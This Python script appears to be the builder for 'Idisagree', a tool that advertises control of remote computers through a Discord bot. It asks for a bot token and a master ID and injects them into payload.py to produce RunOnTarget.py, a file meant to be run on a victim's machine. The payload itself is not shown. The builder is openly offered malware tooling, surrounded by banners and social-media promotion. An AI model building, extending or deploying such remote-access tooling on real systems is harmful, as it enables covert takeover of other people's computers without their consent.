#       Idisagree
#     by: UNDEADSEC
#
###########################
from __future__ import print_function
from os import system
RED, CYAN, GREEN, END = '\033[91m', '\033[36m', '\033[1;32m', '\033[0m'

def ascii():
    system('clear')
    print('''
{2}  (\____/){2}-{1} UNDEADSEC {2}|{1} t.me/UndeadSec {2}|{1} youtube.com/c/UndeadSec {2}- BRAZIL
{2}   (_oo_)       {2}██{0}      ██ ██ ██████ ██████ ██████      ██████ ██████{1}
{2}     (O)        {2}██{0}      ██    ██         ██ ██     ██   ██  ██ ██  ██{1}
{2}   __||__    \) {2}██{0}  ██████ ██ ██████ ██████ ██ ███ ████ ██████ ██████{1}
{2}[]/______\[] /  {2}██{0}  ██  ██ ██     ██ ██  ██ ██  ██ ██   ██     ██{1}
{2}/ \______/ \/   {2}██{0}  ██████ ██ ██████ ██████ ██████ ██   ██████ ██████{1}
{2}    /__\              {2}CONTROL REMOTE COMPUTERS USING DISCORD BOT{1} v1.0
                                            Stay tuned on Twitter: @UndeadSec
{3}[{1}?{3}]{1} IT'S YOUR FIRST TIME HERE?
{3}:{1} FOLLOW THESE STEPS:

{3}>{1} CREATE AN ACCOUNT AT DISCORD AND GET YOUR DISCORD ID. EXAMPLE: TEST#0000
({2}https://discordapp.com/{1})
{3}>{1} CREATE A DISCORD SERVER 
({2}https://discordapp.com/{1})
{3}>{1} CREATE AN DISCORD APP AND MAKE YOUR APP INTO A BOT 
({2}https://discordapp.com/developers/applications/me#top{1})
{3}>{1} GET THE BOT TOKEN 
({2}https://discordapp.com/developers/applications/me#top{1})
{3}>{1} ADD BOT TO YOUR DISCORD SERVER
({2}Complete tutorial: https://github.com/UndeadSec/Idisagree{1})'''.format(RED, END, CYAN, GREEN))

def end():
    system('clear')
    print('''
            {3}I{1} 
       ;     /        ,--.     
       [{3}"{1}]   [{3}"{1}]  ,<  |__{3}**{1}|    
      /[_]\  [~]\/    |//  |    
       ] [   OOO      /o|__|
              {3}DISAGREE{1}
   
{1}[ {0}Watch us on YouTube:{1} https://youtube.com/c/UndeadSec ]
[ {0}Follow me on Twitter:{1} https://twitter.com/A1S0N_ ]
[ {0}Contribute on Github:{1} https://github.com/UndeadSec/Idisagree ]
[ {0}Join our Telegram Group(Portuguese):{1} https://t.me/UndeadSec ]\n'''.format(GREEN, END, CYAN, RED))

def generate(botToken, botMaster):
    info = 'botToken = ' + '\'' + botToken + '\'' +'\nbotMaster = ' + '\'' + botMaster + '\'' 
    with open('payload.py','r') as contents:
        save = contents.read()
    with open('RunOnTarget.py','w') as contents:
        contents.write(info)
    with open('RunOnTarget.py','a') as contents:
        contents.write(save)
    return('{0}[{1}*{0}]{1} Saved as {2}RunOnTarget.py{1}'.format(GREEN, END, RED))

def config():   
    botToken = input('\n[{0}I{1}disagree{2}] BOT TOKEN: '.format(CYAN, RED, END))
    botMaster = input('[{0}I{1}disagree{2}] BOT MASTER: '.format(CYAN, RED, END))
    print('\n[~] Configuration:\n [BOT TOKEN] =' + botToken + '\n [BOT MASTER] = ' + botMaster)
    confirm = input('\nConfirm ? (y/n) : ')
    if confirm.upper() == 'Y':
        print(generate(botToken, botMaster))
    else:
        config()

def main():
    ascii()
    config()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        end()
        exit(0)
